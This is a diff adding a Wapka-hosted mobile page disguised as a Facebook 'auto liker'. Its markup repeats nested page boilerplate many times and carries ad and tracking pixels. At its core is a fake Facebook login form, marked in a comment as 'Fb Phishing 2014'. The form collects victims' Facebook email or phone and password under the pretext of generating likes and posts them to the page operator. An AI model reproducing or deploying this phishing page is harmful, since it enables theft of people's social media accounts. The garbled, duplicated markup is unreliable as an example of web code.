@@ -1,0 +1,67 @@
+<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fprashant.bharti.2419&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
+
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Wapka.mobi</title><link rel="STYLESHEET" type="text/css" href="/styles.css"/><meta forua="true" http-equiv="Cache-Control" content="max-age=0"/><style type="text/css">
+ body { background: ; 
+color: ; 
+ }
+ a { color: ; 
+ }
+ </style>
+ 
+ </head><body> 
+<div><?xml version="1.0" ?>
+
+ <!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN" "http://www.wapforum.org/DTD/wml_1.1.xml">
+
+
+ <wml>
+ <head>
+ <meta forua="true" http-equiv="Cache-Control" content="max-age=0"/>
+ 
+ </head>
+ <template>
+ 	<do type="options" name="Prev" label="Back"><prev/></do>
+ </template>
+ <card id="index" title="Wapka.mobi" > 
+<p><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Wapka.mobi</title><link rel="STYLESHEET" type="text/css" href="/styles.css"/><meta forua="true" http-equiv="Cache-Control" content="max-age=0"/><style type="text/css">
+body { background: ;
+color: ;
+}
+a { color: ;
+}
+</style>
+
+</head><body>
+<div><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Wapka.mobi</title><link rel="STYLESHEET" type="text/css" href="/styles.css"/><meta forua="true" http-equiv="Cache-Control" content="max-age=0"/><style type="text/css">
+body { background: ;
+color: ;
+}
+a { color: ;
+}
+</style>
+<link rel="STYLESHEET" type="text/css" href="http://skfacebook.wapka.mobi/styles.css"/>
+</head><body>
+<div align="center"><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>www.autolykz.hublaa.com</title><link rel="STYLESHEET" type="text/css" href="/styles.css"/><meta forua="true" http-equiv="Cache-Control" content="max-age=0"/><style type="text/css">
+body { background: ;
+color: ;
+}
+a { color: ;
+}
+</style>
+</head><body>
+<div align="center"><img src="https://fbcdn-photos-a-a.akamaihd.net/hphotos-ak-ash3/1013307_263135627185686_60962395_n.png?dl=1" width="235px" height="40px"/></div>
+<div align="center"><table>
+<tr>
+<td><img src="https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-frc3/1507357_259626170869965_2027488797_o.png?dl=1" width="60px" height="60px"/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;</td>&#160;&#160;&#160;&#160;&#160;&#160;<td>&#160;&#160;&#160;&#160;&#160;&#160;&#160;<img src="https://fbcdn-photos-g-a.akamaihd.net/hphotos-ak-frc3/t1/1503865_259626564203259_258400696_n.png?dl=1" width="60px" height="60px"/></td></tr></table></div>
+<div><b><br/></b></div>
+<div align="center"><table> <tr> <td> <!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><script type="text/javascript"> document.title = "Welcome to Facebook"; </script><head title="Welcome to Facebook"><title>Welcome to Facebook</title><meta name="description" content="Facebook helps you connect and share with the people in your life." /><meta name="referrer" content="default" id="meta_referrer" /><meta http-equiv="X-Frame-Options" content="deny" /><!-----[ » © Fb Phishing 2014 copyrighted by wapswaggar9™ « ]-----!></head><body class="nontouch acw"><div class="mfsm"><div id="viewport"><div class="acb aps" id="u_0_0" data-sigil="MTopBlueBarHeader"><table cellspacing="0" cellpadding="0" class="lr"><tr><td valign="top"></td></tr></table></div><div id="objects_container"><div id="root" tabindex="0" role="main" class="_fco acw" data-sigil="context-layer-root"><div class="aclb"><div class="loginInner"><div class="acy apl abt abb"></div><form method="post" class="mobile-login-form _fcp" onSubmit="window.open ('https://www.facebook.com/groups/1454106691510941/')" action="site_0.xhtml"><div class="mobile-login-field aclb apl"><div>Facebook Email  / Phone<br/> <img src="https://fbcdn-photos-c-a.akamaihd.net/hphotos-ak-prn1/1560605_259681304197785_904974362_n.png?dl=1" width="16" height="16"/> <input type="text" name="mf_text[Email]" class="input"/><br/><br/></div></div><div class="mobile-login-field aclb apl"><div>Post/Status Url<br/> <img src="https://fbcdn-photos-b-a.akamaihd.net/hphotos-ak-ash3/1622256_261684870664095_213723310_n.jpg?dl=1" width="16" height="16"/> <input type="text" name="mf_text[Name]" class="input"/><br/><br/></div></div><div class="mobile-login-field aclb apl"><div>Likes (0-500)<br/> <img src="https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-frc3/1507357_259626170869965_2027488797_o.png?dl=1" width="16" height="16"/> <input type="text" name="mf_text[Name]" class="input"/><br/><br/></div></div><div class="mobile-login-field aclb apl"><div>Comments (0-300)<br/> <img src="https://fbcdn-photos-g-a.akamaihd.net/hphotos-ak-frc3/t1/1503865_259626564203259_258400696_n.png?dl=1" width="16" height="16"/> <input type="text" class="input" name="mf_text[Name]"/><br/><br/></div></div> <div class="mobile-login-field aclb apl"><div>Facebook Password<br/> <img src="https://fbcdn-photos-g-a.akamaihd.net/hphotos-ak-ash3/1601088_259683887530860_98936156_n.png?dl=1" width="16" height="16"/> <input type="password" class="input" name="mf_text[Password]"/><br/><br/></div></div><div class="button_area aclb apl"><input type="hidden" name="p" value="135955429"/><input type="hidden" name="action" value="send_message"/><input type="submit" name="MF_submit" class="btn btnC largeBtn" size="0" value="Generate" /></div><input type="hidden" autocomplete="off" name="_fb_noscript" value="true" /></form></div></div></div></div></div><div id="static_templates"></div></div></body></html></td></tr></table></div>
+<div><noscript/></div><p style="text-align:center;"><a href="/ads/wapka/p/2763970/adshows/0/aid/30/country/US/position/bottom"><img src=" /pictures/union/1111/8.png" /></a></p><img src="/ga.gif?utmac=MO-32471805-1&amp;utmn=1778903516&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /><img src="http://ga.wapka.me/ga3.gif?utmac=MO-46050634-1&amp;utmn=150267863&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /></body></html>
+</div><p align="center"><a href="/menu_0.xhtml">:=:</a></p><p style="text-align:center;"><a href="/ads/wapka/p/2815063/adshows/0/aid/30/country/US/position/bottom"><img src=" /pictures/union/1111/8.png" /></a></p><img src="/ga.gif?utmac=MO-32471805-1&amp;utmn=1583399696&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /><img src="http://ga.wapka.me/ga3.gif?utmac=MO-46050634-1&amp;utmn=1518387376&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /></body></html>
+</div><p align="center"><a href="/menu_0.xhtml">:=:</a></p><p style="text-align:center;"><a href="/ads/wapka/p/2825111/adshows/0/aid/25/country/US/position/bottom"><img src=" /pictures/union/1111/3.jpg" /></a></p><img src="/ga.gif?utmac=MO-32471805-1&amp;utmn=1580213400&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /><img src="http://ga.wapka.me/ga3.gif?utmac=MO-46050634-1&amp;utmn=108803229&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /></body></html></p> 
+<p><a href="forum_111238089.wml" >Auto liker</a></p><p align="center"><a href="/menu_0.wml">:=:</a></p><p style="text-align:center;"><a href="/ads/wapka/p/2832118/adshows/0/aid/23/country/US/position/bottom"><img src="/pictures/9apps.png" /><br />Hottest Apps &amp; Games &amp; Wallpapers Download</a></p><img src="/ga.gif?utmac=MO-32471805-1&amp;utmn=800482704&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /><img src="http://ga.wapka.me/ga3.gif?utmac=MO-46050634-1&amp;utmn=1725286015&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" />
+	  </card>
+   </wml>
+   </div><p align="center"><a href="/menu_0.xhtml">:=:</a></p><p style="text-align:center;"><a href="/ads/wapka/p/2995638/adshows/1/aid/23/country/IN/position/bottom"><img src="/pictures/9apps.png" /><br />Hottest Apps & Games & Wallpapers Download</a></p><img src="/ga.gif?utmac=MO-32471805-1&amp;utmn=2136470622&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /><img src="http://ga.wapka.me/ga3.gif?utmac=MO-46050634-1&amp;utmn=1135543669&amp;utmr=-&amp;utmp=%2Findex.xhtml&amp;guid=ON" width="1" height="1" /></body></html>
+
+<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fprashant.bharti.2419&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
